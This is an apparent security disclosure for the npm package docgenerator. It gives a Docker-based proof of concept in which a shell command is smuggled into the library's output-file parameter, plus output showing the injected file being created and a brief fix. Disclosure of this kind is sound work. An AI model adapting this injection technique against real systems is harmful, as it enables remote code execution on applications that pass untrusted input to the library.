@docgenerator is vulnerable to command injection

[Npm Package](https://www.npmjs.com/package/docgenerator)

# Steps To Reproduce
* Create a new Dockerfile container

```
# Dockerfile
FROM node:10-slim
WORKDIR /exploitation
RUN npm i docgenerator
COPY rip.js /exploitation/rip.js
ENTRYPOINT ls -l ; node rip.js ; ls -l 
```
* Create the file rip.js using the following code:

```
var generator = require( 'docgenerator' ),
    path = require( 'path' ),
    fs = require( 'fs' );

// Get all the markdown files in this folder
var files = fs.readdirSync( '.' );

files = files
    .filter( function( file ) {
        return file.substr( -3 ) === '.md';
    })
    .sort();

generator
    .set( 'title', 'Official documentation of tartempion' )
    .set( 'toc', true )
    .set( 'table', true )
    .set( 'files', files )
    .set( 'output', 'documentation.html; $(touch /exploitation/bitcoinMiner.txt)' )
    .generate();
    
 ```
 
  * Build and Run the container with the following commands:
  ```
  $ docker build . -t docsexploit
  $ docker run docsexploit
  ```
  
  Sample Output
  
  ```
total 8
drwxr-xr-x 1 root root  42 Feb  5 23:26 node_modules
-rw-r--r-- 1 root root 512 Feb  5 23:26 package-lock.json
-rw-r--r-- 1 root root 539 Feb  5 23:23 rip.js
fs.js:114
    throw err;
    ^

Error: ENOENT: no such file or directory, open 'documentation.html; $(touch /exploitation/bitcoinMiner.txt)'
    at Object.openSync (fs.js:443:3)
    at Object.writeFileSync (fs.js:1194:35)
    at Object.appendFileSync (fs.js:1240:6)
    at /exploitation/node_modules/docgenerator/lib/index.js:100:16
    at ChildProcess.exithandler (child_process.js:285:7)
    at ChildProcess.emit (events.js:198:13)
    at maybeClose (internal/child_process.js:982:16)
    at Socket.stream.socket.on (internal/child_process.js:389:11)
    at Socket.emit (events.js:198:13)
    at Pipe._handle.close (net.js:607:12)
total 12
-rw-r--r-- 1 root root 188 Feb  5 23:27 88ac3064-6c59-4a5a-a859-ab7a2c4c301b
-rw-r--r-- 1 root root   0 Feb  5 23:27 bitcoinMiner.txt
-rw-r--r-- 1 root root   0 Feb  5 23:27 documentation.html
drwxr-xr-x 1 root root  42 Feb  5 23:26 node_modules
-rw-r--r-- 1 root root 512 Feb  5 23:26 package-lock.json
-rw-r--r-- 1 root root 539 Feb  5 23:23 rip.js

```

As you can see the malicious file bitcoinMiner.txt was introduced.
If a node project using this library takes the output parameter from untrusted input it will lead to remote code execution.

# Remediation

Use the .spawn() directive.
  
  
